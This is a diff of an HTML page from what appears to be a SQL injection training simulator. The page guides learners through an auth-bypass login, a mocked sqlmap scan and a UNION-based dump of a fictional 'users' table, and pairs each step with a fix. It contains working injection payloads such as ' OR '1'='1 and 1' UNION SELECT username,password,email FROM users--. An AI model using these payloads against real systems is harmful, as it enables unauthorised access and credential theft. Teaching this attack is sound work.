+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: var(--text2);
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    .ls-field {
+      margin-bottom: 12px;
+    }
+
+    .ls-label {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 9px;
+      letter-spacing: 2px;
+      color: var(--text2);
+      margin-bottom: 5px;
+    }
+
+    .ls-input {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 10px 14px;
+      color: #fff;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 13px;
+      outline: none;
+      transition: all .2s;
+    }
+
+    .ls-input:focus {
+      border-color: var(--cyan);
+    }
+
+    .ls-input.injected {
+      border-color: var(--red);
+      color: var(--red);
+    }
+
+    .ls-input.clean {
+      border-color: var(--border);
+      color: var(--text2);
+    }
+
+    .ls-btn {
+      width: 100%;
+      padding: 11px;
+      background: linear-gradient(135deg, rgba(0, 245, 255, 0.1), rgba(168, 85, 247, 0.08));
+      border: 1px solid var(--cyan);
+      color: var(--cyan);
+      font-family: 'Orbitron', sans-serif;
+      font-size: 10px;
+      letter-spacing: 2px;
+      cursor: pointer;
+      border-radius: 6px;
+      transition: all .2s;
+      margin-top: 4px;
+    }
+
+    .ls-btn:hover {
+      background: var(--cyan);
+      color: #040d1a;
+    }
+
+    .ls-result {
+      margin-top: 14px;
+      min-height: 24px;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 12px;
+      border-radius: 6px;
+      padding: 10px 14px;
+      display: none;
+    }
+
+    .ls-result.show {
+      display: block;
+    }
+
+    .ls-result.fail {
+      background: rgba(255, 51, 102, 0.07);
+      border: 1px solid rgba(255, 51, 102, 0.3);
+      color: var(--red);
+    }
+
+    .ls-result.warn {
+      background: rgba(255, 189, 0, 0.07);
+      border: 1px solid rgba(255, 189, 0, 0.3);
+      color: var(--yellow);
+    }
+
+    .ls-result.success {
+      background: rgba(0, 255, 136, 0.07);
+      border: 1px solid rgba(0, 255, 136, 0.3);
+      color: var(--green);
+    }
+
+    .payload-hints {
+      margin-bottom: 16px;
+    }
+
+    .payload-hints-lbl {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 12px;
+      color: var(--text2);
+      margin-bottom: 8px;
+    }
+
+    .hint-tags {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .hint-tag {
+      background: rgba(0, 245, 255, 0.06);
+      border: 1px solid var(--border2);
+      color: var(--text2);
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      padding: 3px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all .2s;
+    }
+
+    .hint-tag:hover {
+      border-color: var(--cyan);
+      color: var(--cyan);
+    }
+
+    .attempts-counter {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: var(--text2);
+      margin-bottom: 12px;
+    }
+
+    .attempts-counter span {
+      color: var(--yellow);
+    }
+
+    .vuln-popup {
+      display: none;
+      background: linear-gradient(135deg, rgba(0, 255, 136, 0.07), rgba(0, 245, 255, 0.04));
+      border: 1px solid rgba(0, 255, 136, 0.35);
+      border-radius: 12px;
+      padding: 20px;
+      margin-top: 16px;
+    }
+
+    .vuln-popup.show {
+      display: block;
+      animation: popIn .4s cubic-bezier(.34, 1.56, .64, 1);
+    }
+
+    @keyframes popIn {
+      0% {
+        opacity: 0;
+        transform: scale(.9) translateY(8px);
+      }
+
+      100% {
+        opacity: 1;
+        transform: scale(1) translateY(0);
+      }
+    }
+
+    .vuln-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--green);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .vuln-body {
+      font-size: 13px;
+      color: var(--text2);
+      line-height: 1.65;
+    }
+
+    .vuln-body strong {
+      color: var(--cyan);
+    }
+
+    .terminal {
+      background: #020a14;
+      border: 1px solid var(--border2);
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 14px;
+    }
+
+    .terminal-bar {
+      background: #0a1628;
+      border-bottom: 1px solid var(--border2);
+      padding: 9px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .t-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+
+    .t-red {
+      background: #ff5f57;
+    }
+
+    .t-yellow {
+      background: #ffbd2e;
+    }
+
+    .t-green-dot {
+      background: #28c840;
+    }
+
+    .terminal-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 9px;
+      letter-spacing: 2px;
+      color: var(--text2);
+      margin-left: auto;
+    }
+
+    .terminal-body {
+      padding: 16px;
+      height: 240px;
+      overflow-y: auto;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 12px;
+      line-height: 1.7;
+    }
+
+    .terminal-body::-webkit-scrollbar {
+      width: 4px;
+    }
+
+    .terminal-body::-webkit-scrollbar-thumb {
+      background: var(--border2);
+      border-radius: 2px;
+    }
+
+    .t-line {
+      margin-bottom: 2px;
+    }
+
+    .t-cmd {
+      color: var(--cyan);
+    }
+
+    .t-fail {
+      color: rgba(255, 51, 102, 0.7);
+    }
+
+    .t-warn {
+      color: var(--yellow);
+    }
+
+    .t-ok {
+      color: var(--green);
+      font-weight: bold;
+    }
+
+    .t-dim {
+      color: rgba(122, 154, 184, 0.5);
+    }
+
+    .t-data {
+      color: var(--purple);
+      font-weight: bold;
+    }
+
+    .btn-launch {
+      width: 100%;
+      padding: 13px;
+      background: linear-gradient(135deg, rgba(255, 107, 53, 0.15), rgba(255, 51, 102, 0.1));
+      border: 1px solid var(--orange);
+      color: var(--orange);
+      font-family: 'Orbitron', sans-serif;
+      font-size: 11px;
+      letter-spacing: 2px;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: all .2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn-launch:hover:not(:disabled) {
+      background: var(--orange);
+      color: #040d1a;
+    }
+
+    .btn-launch:disabled {
+      opacity: .4;
+      cursor: not-allowed;
+    }
+
+    .dict-stats {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-top: 12px;
+    }
+
+    .dstat {
+      background: var(--bg2);
+      border: 1px solid var(--border2);
+      border-radius: 8px;
+      padding: 12px;
+      text-align: center;
+    }
+
+    .dstat-val {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--cyan);
+    }
+
+    .dstat-lbl {
+      font-size: 10px;
+      color: var(--text2);
+      letter-spacing: 1px;
+      margin-top: 3px;
+    }
+
+    .extract-machine {
+      background: var(--bg2);
+      border: 1px solid var(--border2);
+      border-radius: 12px;
+      padding: 24px;
+      margin-bottom: 16px;
+    }
+
+    .extract-label {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 10px;
+      letter-spacing: 2px;
+      color: var(--text2);
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .db-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 12px;
+      margin-bottom: 16px;
+    }
+
+    .db-table th {
+      background: rgba(0, 245, 255, 0.08);
+      border: 1px solid var(--border2);
+      padding: 8px 12px;
+      color: var(--cyan);
+      font-family: 'Orbitron', sans-serif;
+      font-size: 9px;
+      letter-spacing: 1px;
+      text-align: left;
+    }
+
+    .db-table td {
+      border: 1px solid var(--border2);
+      padding: 8px 12px;
+      color: var(--text2);
+      transition: all .3s;
+    }
+
+    .db-table td.revealed {
+      color: var(--green);
+      background: rgba(0, 255, 136, 0.05);
+    }
+
+    .db-table td.spinning {
+      color: var(--yellow);
+    }
+
+    .extract-progress {
+      margin-bottom: 14px;
+    }
+
+    .ep-lbl {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      color: var(--text2);
+      font-family: 'Share Tech Mono', monospace;
+      margin-bottom: 5px;
+    }
+
+    .ep-track {
+      background: var(--bg);
+      border-radius: 3px;
+      height: 5px;
+      overflow: hidden;
+    }
+
+    .ep-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--purple), var(--cyan));
+      border-radius: 3px;
+      width: 0%;
+      transition: width .4s;
+    }
+
+    .query-display {
+      background: #020a14;
+      border: 1px solid var(--border2);
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: var(--text2);
+      margin-bottom: 14px;
+      word-break: break-all;
+      line-height: 1.6;
+    }
+
+    .query-display .inj {
+      color: var(--red);
+    }
+
+    .query-display .kw {
+      color: var(--cyan);
+    }
+
+    .btn-extract {
+      width: 100%;
+      padding: 13px;
+      background: linear-gradient(135deg, rgba(255, 51, 102, 0.18), rgba(168, 85, 247, 0.12));
+      border: 1px solid var(--red);
+      color: var(--red);
+      font-family: 'Orbitron', sans-serif;
+      font-size: 11px;
+      letter-spacing: 2px;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: all .2s;
+    }
+
+    .btn-extract:hover:not(:disabled) {
+      background: var(--red);
+      color: #fff;
+      box-shadow: 0 0 28px rgba(255, 51, 102, 0.4);
+    }
+
+    .btn-extract:disabled {
+      opacity: .4;
+      cursor: not-allowed;
+    }
+
+    .breach-alert {
+      display: none;
+      background: linear-gradient(135deg, rgba(255, 51, 102, 0.12), rgba(168, 85, 247, 0.07));
+      border: 2px solid var(--red);
+      border-radius: 12px;
+      padding: 22px;
+      text-align: center;
+      margin-top: 14px;
+    }
+
+    .breach-alert.show {
+      display: block;
+      animation: popIn .5s cubic-bezier(.34, 1.56, .64, 1);
+    }
+
+    .breach-ico {
+      font-size: 44px;
+      margin-bottom: 10px;
+    }
+
+    .breach-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 18px;
+      font-weight: 900;
+      color: var(--red);
+      text-shadow: 0 0 20px rgba(255, 51, 102, 0.5);
+      margin-bottom: 6px;
+    }
+
+    .breach-sub {
+      color: var(--text2);
+      font-size: 13px;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+
+    .breach-sub strong {
+      color: var(--cyan);
+    }
+
+    .btn-complete {
+      padding: 13px 36px;
+      background: linear-gradient(135deg, var(--green), #00cc66);
+      border: none;
+      border-radius: 8px;
+      color: #040d1a;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      cursor: pointer;
+      transition: all .2s;
+      box-shadow: 0 0 28px rgba(0, 255, 136, 0.3);
+    }
+
+    .btn-complete:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 44px rgba(0, 255, 136, 0.5);
+    }
+
+    .l2-progress {
+      background: var(--card);
+      border: 1px solid var(--border2);
+      border-radius: 12px;
+      padding: 16px 22px;
+      margin-bottom: 22px;
+      display: flex;
+      align-items: center;
+      gap: 18px;
+    }
+
+    .l2-prog-label {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 10px;
+      letter-spacing: 2px;
+      color: var(--text2);
+      white-space: nowrap;
+    }
+
+    .l2-prog-track {
+      flex: 1;
+      background: var(--bg2);
+      border-radius: 4px;
+      height: 6px;
+      overflow: hidden;
+    }
+
+    .l2-prog-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--red), var(--purple), var(--cyan));
+      border-radius: 4px;
+      transition: width .8s ease;
+      width: 0%;
+    }
+
+    .l2-prog-pct {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--cyan);
+      min-width: 36px;
+      text-align: right;
+    }
+
+    @media(max-width:860px) {
+      .ops-layout {
+        grid-template-columns: 1fr;
+      }
+
+      .bio-card {
+        position: static;
+      }
+
+      .dict-stats {
+        grid-template-columns: 1fr 1fr;
+      }
+
+      #nav {
+        padding: 12px 20px;
+      }
+
+      #statusbar {
+        padding: 7px 20px;
+      }
+
+      .main-scroll {
+        padding: 80px 20px 70px;
+      }
+    }
+  </style>
 </head>
+
 <body>
-<div id="gridbg"></div>
+  <div id="gridbg"></div>
 
-<nav id="nav">
-  <div class="nav-logo">
-    <div class="nav-logo-icon">S</div>
-    <span class="nav-logo-text">ShieldSimulation</span>
-  </div>
-  <div class="nav-links"><a>About</a><a>Features</a><a>Contact</a></div>
-  <div class="nav-right">
-    <span id="navUser"></span>
-    <button id="navLogout" onclick="logout()">LOGOUT</button>
-  </div>
-</nav>
+  <nav id="nav">
+    <div class="nav-logo">
+      <div class="nav-logo-icon">S</div>
+      <span class="nav-logo-text">ShieldSimulation</span>
+    </div>
+    <div class="nav-links"><a>About</a><a>Features</a><a>Contact</a></div>
+    <div class="nav-right">
+      <span id="navUser"></span>
+      <button id="navLogout" onclick="logout()">LOGOUT</button>
+    </div>
+  </nav>
 
-<div id="statusbar">
-  <div><span class="sdot red" id="sdot"></span><span id="stext">⚠ OFFENSIVE MODE ACTIVE — Training Environment Only</span></div>
-  <span>© 2026 ShieldSimulation | Secure Training Platform</span>
-</div>
-
-<div class="main-scroll">
-<div class="inner">
-
-  <div class="breadcrumb">
-    <span class="bc-link" onclick="goHome()">Home</span>
-    <span class="bc-sep">›</span>
-    <span class="bc-link" onclick="goSqiLevels()">SQL Injection</span>
-    <span class="bc-sep">›</span>
-    <span style="color:var(--red)">Level 2: Offensive Ops</span>
+  <div id="statusbar">
+    <div><span class="sdot red" id="sdot"></span><span id="stext">⚠ OFFENSIVE MODE ACTIVE — Training Environment
+        Only</span></div>
+    <span>© 2024 ShieldSimulation | Secure Training Platform</span>
   </div>
 
-  <div style="margin-bottom:28px;">
-    <div class="glitch-wrap" data-text="INJECTION OPERATIONS" style="font-family:'Orbitron',sans-serif;font-size:clamp(20px,3vw,36px);font-weight:900;color:var(--red);text-shadow:0 0 30px rgba(255,51,102,0.5);margin-bottom:6px;">INJECTION OPERATIONS</div>
-    <div style="color:var(--text2);font-size:15px;">You are now thinking like an attacker. Probe the target, automate the assault, and extract the database. 🎯</div>
-  </div>
+  <div class="main-scroll">
+    <div class="inner">
 
-  <div class="l2-progress">
-    <div class="l2-prog-label">LEVEL 2 PROGRESS</div>
-    <div class="l2-prog-track"><div class="l2-prog-fill" id="l2progFill"></div></div>
-    <div class="l2-prog-pct" id="l2progPct">0%</div>
-  </div>
-
-  <div class="ops-layout">
-
-    <!-- Bio card -->
-    <div class="bio-card">
-      <div class="bio-header">
-        <div class="bio-status"></div>
-        <span class="bio-header-text">◈ TARGET APPLICATION DOSSIER</span>
+      <div class="breadcrumb">
+        <span class="bc-link" onclick="goHome()">Home</span>
+        <span class="bc-sep">›</span>
+        <span class="bc-link" onclick="goSqiLevels()">SQL Injection</span>
+        <span class="bc-sep">›</span>
+        <span style="color:var(--red)">Level 2: Offensive Ops</span>
       </div>
-      <div class="bio-avatar">🗄️</div>
-      <div class="bio-name">ShopVault DB</div>
-      <div class="bio-role">// TARGET ACQUIRED — RECON COMPLETE</div>
-      <div class="bio-rows">
-        <div class="bio-row"><span class="bio-key">APP</span><span class="bio-val">shopvault.net</span></div>
-        <div class="bio-row"><span class="bio-key">ENDPOINT</span><span class="bio-val">/login.php</span></div>
-        <div class="bio-row"><span class="bio-key">DB ENGINE</span><span class="bio-val">MySQL 5.7</span></div>
-        <div class="bio-row"><span class="bio-key">PARAMETER</span><span class="bio-val">username</span></div>
-        <div class="bio-row"><span class="bio-key">FILTERING</span><span class="bio-val" style="color:var(--red)">NONE DETECTED</span></div>
-        <div class="bio-row"><span class="bio-key">ERROR MODE</span><span class="bio-val" style="color:var(--red)">VERBOSE ON</span></div>
-        <div class="bio-row"><span class="bio-key">TARGET TABLE</span><span class="bio-val">users</span></div>
-        <div style="text-align:center;margin-top:6px;"><span class="intel-tag">⚠ RECON VIA FINGERPRINTING</span></div>
+
+      <div style="margin-bottom:28px;">
+        <div class="glitch-wrap" data-text="INJECTION OPERATIONS"
+          style="font-family:'Orbitron',sans-serif;font-size:clamp(20px,3vw,36px);font-weight:900;color:var(--red);text-shadow:0 0 30px rgba(255,51,102,0.5);margin-bottom:6px;">
+          INJECTION OPERATIONS</div>
+        <div style="color:var(--text2);font-size:15px;">You are now thinking like an attacker. Probe the target,
+          automate the assault, and extract the database. 🎯</div>
+      </div>
+
+      <div class="l2-progress">
+        <div class="l2-prog-label">LEVEL 2 PROGRESS</div>
+        <div class="l2-prog-track">
+          <div class="l2-prog-fill" id="l2progFill"></div>
+        </div>
+        <div class="l2-prog-pct" id="l2progPct">0%</div>
+      </div>
+
+      <div class="ops-layout">
+
+        <!-- Bio card -->
+        <div class="bio-card">
+          <div class="bio-header">
+            <div class="bio-status"></div>
+            <span class="bio-header-text">◈ TARGET APPLICATION DOSSIER</span>
+          </div>
+          <div class="bio-avatar">🗄️</div>
+          <div class="bio-name">ShopVault DB</div>
+          <div class="bio-role">// TARGET ACQUIRED — RECON COMPLETE</div>
+          <div class="bio-rows">
+            <div class="bio-row"><span class="bio-key">APP</span><span class="bio-val">shopvault.net</span></div>
+            <div class="bio-row"><span class="bio-key">ENDPOINT</span><span class="bio-val">/login.php</span></div>
+            <div class="bio-row"><span class="bio-key">DB ENGINE</span><span class="bio-val">MySQL 5.7</span></div>
+            <div class="bio-row"><span class="bio-key">PARAMETER</span><span class="bio-val">username</span></div>
+            <div class="bio-row"><span class="bio-key">FILTERING</span><span class="bio-val"
+                style="color:var(--red)">NONE DETECTED</span></div>
+            <div class="bio-row"><span class="bio-key">ERROR MODE</span><span class="bio-val"
+                style="color:var(--red)">VERBOSE ON</span></div>
+            <div class="bio-row"><span class="bio-key">TARGET TABLE</span><span class="bio-val">users</span></div>
+            <div style="text-align:center;margin-top:6px;"><span class="intel-tag">⚠ RECON VIA FINGERPRINTING</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Ops panel -->
+        <div class="ops-panel">
+
+          <!-- Phase 2.1 -->
+          <div class="step-card s-active" id="sc1">
+            <div class="step-hdr">
+              <div class="step-num" id="sn1">1</div>
+              <div class="step-meta">
+                <div class="step-title">Phase 2.1 — Manual Injection Probe</div>
+                <div class="step-sub">Test payloads on the login form to bypass authentication</div>
+              </div>
+              <span class="step-badge badge-active" id="sb1">ACTIVE</span>
+            </div>
+            <div class="step-body">
+              <div class="callout" style="margin-bottom:18px;">
+                <strong>🧠 Attacker Mindset:</strong> The username field feeds directly into a SQL query with no
+                sanitization. A crafted payload can break the query syntax and make the database return <em>all
+                  users</em> — bypassing authentication entirely. Study the hints.
+              </div>
+              <div class="attempts-counter">Attempts: <span id="injectCount">0</span> &nbsp;|&nbsp; Try: <code
+                  style="color:var(--cyan)">' OR '1'='1</code>, <code style="color:var(--cyan)">admin'--</code>, <code
+                  style="color:var(--cyan)">' OR 1=1--</code></div>
+              <div class="login-sim">
+                <div class="login-sim-bar">
+                  <div class="ls-dot" style="background:#ff5f57;"></div>
+                  <div class="ls-dot" style="background:#ffbd2e;"></div>
+                  <div class="ls-dot" style="background:#28c840;"></div>
+                  <div class="ls-url">🔒 shopvault.net/login.php</div>
+                </div>
+                <div class="login-sim-body">
+                  <div class="ls-title">ShopVault Admin Portal</div>
+                  <div class="ls-sub">// Enter your credentials to access</div>
+                  <div class="ls-field">
+                    <div class="ls-label">USERNAME</div>
+                    <input class="ls-input" id="injectInput" type="text" placeholder="Enter username or payload…"
+                      autocomplete="off" />
+                  </div>
+                  <div class="ls-field">
+                    <div class="ls-label">PASSWORD</div>
+                    <input class="ls-input clean" type="password" value="••••••••" disabled />
+                  </div>
+                  <button class="ls-btn" onclick="tryInject()">▶ SUBMIT LOGIN</button>
+                  <div class="ls-result" id="injectResult"></div>
+                </div>
+              </div>
+              <div class="payload-hints">
+                <div class="payload-hints-lbl">💡 Hint — click a payload to auto-fill:</div>
+                <div class="hint-tags">
+                  <span class="hint-tag" onclick="setPayload('admin')">admin</span>
+                  <span class="hint-tag" onclick="setPayload(&quot;admin'&quot;)">admin'</span>
+                  <span class="hint-tag" onclick="setPayload(&quot;' OR '1'='1&quot;)">' OR '1'='1</span>
+                  <span class="hint-tag" onclick="setPayload(&quot;' OR 1=1--&quot;)">' OR 1=1--</span>
+                  <span class="hint-tag" onclick="setPayload(&quot;admin'--&quot;)">admin'--</span>
+                </div>
+              </div>
+              <div class="vuln-popup" id="injectVuln">
+                <div class="vuln-title">✅ VULNERABILITY CONFIRMED — AUTH BYPASS</div>
+                <div class="vuln-body">
+                  <strong>The backend query was:</strong><br />
+                  <code
+                    style="color:var(--red);font-size:11px;">SELECT * FROM users WHERE username='[INPUT]' AND password='...'</code><br /><br />
+                  Your payload broke the logic — <strong>OR 1=1</strong> is always true, so the WHERE clause matched
+                  every row. The comment (<strong>--</strong>) discarded the rest including the password check. Access
+                  granted with no valid credentials.<br /><br />
+                  <strong>Fix:</strong> Prepared statements treat input as data — never as SQL code.
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 2.2 -->
+          <div class="step-card s-locked" id="sc2">
+            <div class="step-hdr">
+              <div class="step-num" id="sn2">2</div>
+              <div class="step-meta">
+                <div class="step-title">Phase 2.2 — Automated SQLMap Scan</div>
+                <div class="step-sub">Deploy sqlmap to enumerate the database schema and dump credentials</div>
+              </div>
+              <span class="step-badge badge-locked" id="sb2">🔒 LOCKED</span>
+            </div>
+            <div class="step-body">
+              <div class="callout warn" style="margin-bottom:16px;">
+                <strong>⚙️ Tool Loaded:</strong> sqlmap v1.7.8 — HTTP-based SQL injection scanner<br />
+                Target: <code>shopvault.net/login.php?username=1</code> · Technique: <code>UNION-based</code>
+              </div>
+              <div class="terminal">
+                <div class="terminal-bar">
+                  <div class="t-dot t-red"></div>
+                  <div class="t-dot t-yellow"></div>
+                  <div class="t-dot t-green-dot"></div>
+                  <div class="terminal-title">SQLMAP TERMINAL — shopvault.net/login.php</div>
+                </div>
+                <div class="terminal-body" id="sqlmapLog">
+                  <div class="t-line t-dim">sqlmap v1.7.8 — automatic SQL injection tool</div>
+                  <div class="t-line t-dim">────────────────────────────────────────────</div>
+                  <div class="t-line t-warn">[READY] Awaiting operator command…</div>
+                </div>
+              </div>
+              <button class="btn-launch" id="launchBtn" onclick="launchSqlmap()"><span>⚡</span> EXECUTE SQLMAP
+                SCAN</button>
+              <div class="dict-stats">
+                <div class="dstat">
+                  <div class="dstat-val" id="smPayloads">0</div>
+                  <div class="dstat-lbl">PAYLOADS</div>
+                </div>
+                <div class="dstat">
+                  <div class="dstat-val" id="smTables">0</div>
+                  <div class="dstat-lbl">TABLES FOUND</div>
+                </div>
+                <div class="dstat">
+                  <div class="dstat-val" id="smStatus">—</div>
+                  <div class="dstat-lbl">STATUS</div>
+                </div>
+              </div>
+              <div class="vuln-popup" id="sqlmapVuln" style="margin-top:14px;">
+                <div class="vuln-title">✅ LESSON: Why sqlmap Is So Dangerous</div>
+                <div class="vuln-body">
+                  sqlmap automatically detects injection points, tests all techniques (Error, Union, Blind, Time-based),
+                  dumps the entire database schema, and extracts table data — all without manual effort. A vulnerable
+                  endpoint can be <strong>fully compromised in minutes.</strong><br /><br />
+                  <strong>Defence:</strong> Parameterized queries + WAF rules make automated scanning ineffective.
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 2.3 -->
+          <div class="step-card s-locked" id="sc3">
+            <div class="step-hdr">
+              <div class="step-num" id="sn3">3</div>
+              <div class="step-meta">
+                <div class="step-title">Phase 2.3 — UNION-Based Data Extraction</div>
+                <div class="step-sub">Watch the database dump credentials row by row in real time</div>
+              </div>
+              <span class="step-badge badge-locked" id="sb3">🔒 LOCKED</span>
+            </div>
+            <div class="step-body">
+              <div class="callout danger" style="margin-bottom:16px;">
+                <strong>🔥 Simulating:</strong> UNION SELECT injection extracting the full <code>users</code>
+                table<br />
+                Payload: <code style="color:var(--red)">1' UNION SELECT username,password,email FROM users--</code>
+              </div>
+              <div class="query-display">
+                <span class="kw">SELECT</span> first_name, last_name <span class="kw">FROM</span> users <span
+                  class="kw">WHERE</span> user_id = '<span class="inj">1' UNION SELECT username,password,email FROM
+                  users--</span>'
+              </div>
+              <div class="extract-machine">
+                <div class="extract-label">◈ REAL-TIME DATABASE ROW EXTRACTION</div>
+                <div class="extract-progress">
+                  <div class="ep-lbl"><span>EXTRACTION PROGRESS</span><span id="epPct">0%</span></div>
+                  <div class="ep-track">
+                    <div class="ep-fill" id="epFill"></div>
+                  </div>
+                </div>
+                <table class="db-table">
+                  <thead>
+                    <tr>
+                      <th>USERNAME</th>
+                      <th>PASSWORD HASH</th>
+                      <th>EMAIL</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td id="r0c0">▓▓▓▓▓▓▓</td>
+                      <td id="r0c1">▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓</td>
+                      <td id="r0c2">▓▓▓▓▓▓▓▓▓▓▓▓</td>
+                    </tr>
+                    <tr>
+                      <td id="r1c0">▓▓▓▓▓▓▓</td>
+                      <td id="r1c1">▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓</td>
+                      <td id="r1c2">▓▓▓▓▓▓▓▓▓▓▓▓</td>
+                    </tr>
+                    <tr>
+                      <td id="r2c0">▓▓▓▓▓▓▓</td>
+                      <td id="r2c1">▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓</td>
+                      <td id="r2c2">▓▓▓▓▓▓▓▓▓▓▓▓</td>
+                    </tr>
+                    <tr>
+                      <td id="r3c0">▓▓▓▓▓▓▓</td>
+                      <td id="r3c1">▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓</td>
+                      <td id="r3c2">▓▓▓▓▓▓▓▓▓▓▓▓</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+              <button class="btn-extract" id="extractBtn" onclick="launchExtraction()">☢ INITIATE UNION
+                EXTRACTION</button>
+              <div class="breach-alert" id="breachAlert">
+                <div class="breach-ico">💀</div>
+                <div class="breach-title">DATABASE DUMPED</div>
+                <div class="breach-sub">
+                  Full <code style="color:var(--red);font-size:15px;">users</code> table extracted in <strong>0.8
+                    seconds</strong>.<br /><br />
+                  A single unsanitized input field handed over <strong>every username, password hash, and email</strong>
+                  in the database. The attacker now has everything needed for offline cracking or credential stuffing
+                  attacks.<br /><br />
+                  <strong>No brute force. No malware. Just one carefully crafted SQL payload.</strong>
+                </div>
+                <button class="btn-complete" onclick="completeLevel()">✓ COMPLETE LEVEL 2 — RETURN TO SQL
+                  INJECTION</button>
+              </div>
+            </div>
+          </div>
+
+        </div>
       </div>
     </div>
-
-    <!-- Ops panel -->
-    <div class="ops-panel">
-
-      <!-- Phase 2.1 -->
-      <div class="step-card s-active" id="sc1">
-        <div class="step-hdr">
-          <div class="step-num" id="sn1">1</div>
-          <div class="step-meta">
-            <div class="step-title">Phase 2.1 — Manual Injection Probe</div>
-            <div class="step-sub">Test payloads on the login form to bypass authentication</div>
-          </div>
-          <span class="step-badge badge-active" id="sb1">ACTIVE</span>
-        </div>
-        <div class="step-body">
-          <div class="callout" style="margin-bottom:18px;">
-            <strong>🧠 Attacker Mindset:</strong> The username field feeds directly into a SQL query with no sanitization. A crafted payload can break the query syntax and make the database return <em>all users</em> — bypassing authentication entirely. Study the hints.
-          </div>
-          <div class="attempts-counter">Attempts: <span id="injectCount">0</span> &nbsp;|&nbsp; Try: <code style="color:var(--cyan)">' OR '1'='1</code>, <code style="color:var(--cyan)">admin'--</code>, <code style="color:var(--cyan)">' OR 1=1--</code></div>
-          <div class="login-sim">
-            <div class="login-sim-bar">
-              <div class="ls-dot" style="background:#ff5f57;"></div>
-              <div class="ls-dot" style="background:#ffbd2e;"></div>
-              <div class="ls-dot" style="background:#28c840;"></div>
-              <div class="ls-url">🔒 shopvault.net/login.php</div>
-            </div>
-            <div class="login-sim-body">
-              <div class="ls-title">ShopVault Admin Portal</div>
-              <div class="ls-sub">// Enter your credentials to access</div>
-              <div class="ls-field">
-                <div class="ls-label">USERNAME</div>
-                <input class="ls-input" id="injectInput" type="text" placeholder="Enter username or payload…" autocomplete="off"/>
-              </div>
-              <div class="ls-field">
-                <div class="ls-label">PASSWORD</div>
-                <input class="ls-input clean" type="password" value="••••••••" disabled/>
-              </div>
-              <button class="ls-btn" onclick="tryInject()">▶ SUBMIT LOGIN</button>
-              <div class="ls-result" id="injectResult"></div>
-            </div>
-          </div>
-          <div class="payload-hints">
-            <div class="payload-hints-lbl">💡 Hint — click a payload to auto-fill:</div>
-            <div class="hint-tags">
-              <span class="hint-tag" onclick="setPayload('admin')">admin</span>
-              <span class="hint-tag" onclick="setPayload(&quot;admin'&quot;)">admin'</span>
-              <span class="hint-tag" onclick="setPayload(&quot;' OR '1'='1&quot;)">' OR '1'='1</span>
-              <span class="hint-tag" onclick="setPayload(&quot;' OR 1=1--&quot;)">' OR 1=1--</span>
-              <span class="hint-tag" onclick="setPayload(&quot;admin'--&quot;)">admin'--</span>
-            </div>
-          </div>
-          <div class="vuln-popup" id="injectVuln">
-            <div class="vuln-title">✅ VULNERABILITY CONFIRMED — AUTH BYPASS</div>
-            <div class="vuln-body">
-              <strong>The backend query was:</strong><br/>
-              <code style="color:var(--red);font-size:11px;">SELECT * FROM users WHERE username='[INPUT]' AND password='...'</code><br/><br/>
-              Your payload broke the logic — <strong>OR 1=1</strong> is always true, so the WHERE clause matched every row. The comment (<strong>--</strong>) discarded the rest including the password check. Access granted with no valid credentials.<br/><br/>
-              <strong>Fix:</strong> Prepared statements treat input as data — never as SQL code.
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Phase 2.2 -->
-      <div class="step-card s-locked" id="sc2">
-        <div class="step-hdr">
-          <div class="step-num" id="sn2">2</div>
-          <div class="step-meta">
-            <div class="step-title">Phase 2.2 — Automated SQLMap Scan</div>
